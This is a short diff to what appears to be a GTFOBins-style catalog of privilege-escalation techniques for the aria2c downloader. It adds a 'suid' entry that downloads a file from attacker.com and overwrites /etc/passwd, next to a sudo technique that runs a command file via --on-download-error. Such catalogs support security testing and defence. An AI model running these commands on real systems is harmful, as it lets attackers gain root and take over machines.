@@ -17,6 +17,10 @@ functions:
         echo "$COMMAND" > $TF
         chmod +x $TF
         sudo aria2c --on-download-error=$TF http://x
+  suid:
+    - code: |
+        aria2c -d /etc/ -o passwd "http://attacker.com/passwd" --allow-overwrite=true
+    - description: Remote download and replace /etc/passwd with root privilege.
   limited-suid:
     - code: |
         COMMAND='id'
